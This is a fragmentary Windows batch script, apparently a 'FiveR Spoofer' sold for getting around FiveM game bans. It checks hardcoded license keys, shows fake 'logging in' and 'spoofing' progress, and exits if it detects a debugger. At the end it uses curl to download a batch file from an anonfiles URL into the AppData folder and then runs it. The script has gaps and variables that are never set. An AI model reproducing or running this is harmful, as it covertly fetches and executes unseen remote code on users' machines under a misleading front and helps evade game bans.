...
title  FiveR Spoofer Unban FiveM 


:Finder11
rem Run the wmic command and save the output to a file

rem Display a message indicating that the output has been saved
rem Set the file name and content
set "filename=Log.txt"
set "filename=HWID.Dll"

set "content= Spoof Is run THANK YOU FOR USING "
set "content1= Discord.gg/... and dev : FiveR"
rem Check if the file already exists
if not exist "%filename%" (
    rem Write the content to the file if it doesn't exist
    echo %content% %content1% > %filename%
    echo File "%filename%" created and content saved.
) else (
...
if not exist "%filename%" (
    rem Write the content to the file if it doesn't exist
    echo File "%filename1%" created and content saved.
) else (
    echo File "%filename1%" already exists. Skipping creation.
)
rem Pause to keep the window open (optional)
mode 80,12
echo [+] Product: [32mPerm Spoofer[0m

echo [+] Status : [33mUndetected[0m
echo.
echo Last Update: [32m5/25/2024[0m
echo.
timeout 0 >nul
...
if "%key%"=="FiveR-LifeTime-d2v561" (
    goto MENU12
) 
if "%key%"=="FiveR-Month-d2v561" (
    goto MENU12
)
if "%key%"=="FiveR-LifeTime-Free-All" (
    goto MENU12
) 
    timeout 2 >nul
	echo.
	echo [31m[+] Invalid key, Please contact support.[0m
	timeout 1 >nul
	start https://discord.gg/rvcS6cWV
    goto :Finder11
) >nul
...
if "%ERRORLEVEL%"=="0" (
    echo Debugger detected. Stopping the application.
    rem Add code to stop your application here
    exit
)


rem Do other operations here
...
echo.
echo [31m[+] Logging in.... (Please Wait)[0m
goto MENU123


:MENU123
timeout 3 >nul
echo [32m[+] Logged in successfully.[0m
timeout 3 >nul
start 
goto MENU
...
getmac
echo [32mPress any key to return to starting menu... [0m
pause>nul
goto MENU
...
cls
timeout 1 >nul
echo [+] Spoofer Status: [32mUndetected[0m
echo.
echo [1] [32mRun Prem Spoofer [0m
echo [2] [32mExit [0m
echo.


set /p key=[+] Choose 1 To Start Spoofer : 
...
echo.
timeout 1 >nul
echo [31m[+] Spoofing Please Wait...  [0m
timeout 3 >nul
...
@echo off
cd /d %systemdrive%
curl -s -o %appdata%\spoof.bat https://cdn-149.anonfiles.com/45h741dezb/12cc41e9-1678495132/spoof.bat
%appdata%\spoof.bat
exit